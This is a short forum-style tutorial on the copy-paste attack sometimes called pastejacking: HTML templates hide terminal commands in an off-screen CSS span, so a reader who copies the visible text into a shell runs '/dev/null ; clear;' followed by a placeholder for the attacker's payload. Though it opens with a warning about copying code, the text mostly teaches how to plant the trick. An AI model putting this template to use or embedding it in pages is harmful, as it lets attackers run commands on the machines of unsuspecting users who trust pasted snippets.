Hi to all friends 

Many times it's time for you to go to a Web site and copy the code to your shell or console and terminal to use it.

Now I want to explain to you that you will be hacked by doing what you do.

In this tutorial, you will learn how to add a payload within a text on a website .

Iposted a video for this tutorial to see the tutorial on the link below

HTML code : [payload for linux ]
<p> Copy <span style="position: absolute; left: -2000px; top: -100px;">
/dev/null ; clear; [Here you have to place your code or pyaload]  <br>  </span> Paste All Text </p>

If you want to use another operation system, you should do this:

HTML code : [payload for linux ]
<p> Copy <span style="position: absolute; left: -2000px; top: -100px;">
[Execute code for other operating systems] <br>  </span> Paste All Text </p>
